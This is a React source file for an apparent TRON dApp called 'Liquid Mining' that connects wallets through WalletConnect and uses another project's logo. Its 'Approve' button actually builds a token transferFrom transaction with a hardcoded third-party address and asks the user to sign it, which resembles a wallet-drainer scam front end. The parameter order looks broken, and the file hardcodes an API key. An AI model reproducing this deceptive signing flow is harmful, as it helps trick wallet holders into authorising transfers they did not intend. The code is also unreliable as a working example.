import './App.css'
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
import {useState} from "react";
// @ts-ignore
import TronWeb from 'tronweb';
import { Buffer } from 'buffer';

// @ts-ignore
export function App() {
  const [addressUser, setAddressUser] = useState('');
  const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
      relayUrl: 'wss://relay.walletconnect.com',
      projectId: 'c9024b147776f06d4fa6e75a68c0e220',
      metadata: {
        name: 'Liquid Mining',
        description: 'Liquid Mining WalletConnect',
        url: 'https://liquidmining.com/',
        icons: ['https://app.justlend.org/mainLogo.svg']
      }
    },
  })


  const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': 'faafc2f3-1510-4a3b-88a4-ce173fa433d8' },
  });

  // @ts-ignore
  window.Buffer = Buffer;

  const connect = async () => {
    await adapter.connect();
    setAddressUser(adapter.address || '')
  }

  const approve = async () => {
    // const contract = await tronWeb.contract('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
    // console.log(contract)
    // console.log(tronWeb)
    const walletconnectAdapter = adapter
    try {
      const functionSelector = 'transferFrom (23b872dd)';

      const parameter = [
        {name: '_to', type:'address',value: addressUser},
        {name: '_value', type:'uint256', value: 1},
        {name: '_from', type:'address', value: 'TMvyn7pvVWWUR6A6YB6Ukquis4MhW11xeZ'},
      ]
      await walletconnectAdapter.connect();
      const tx = await tronWeb.transactionBuilder.triggerSmartContract('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', functionSelector,
        {
          feeLimit: 10_000_000_000,
        },
        parameter, addressUser);

      const res = await walletconnectAdapter.signTransaction(tx.transaction)
      console.log('res', res)
    } catch (e) {
      console.log('e:', e)
    }

    // await tronWeb.trx.sendRawTransaction(signedTransaction);
  }

  return (
    <>
      <button onClick={connect}>Connect</button>
      <button onClick={approve}>Approve</button>
      <p>address: {addressUser}</p>
    </>
  )
}

export default App
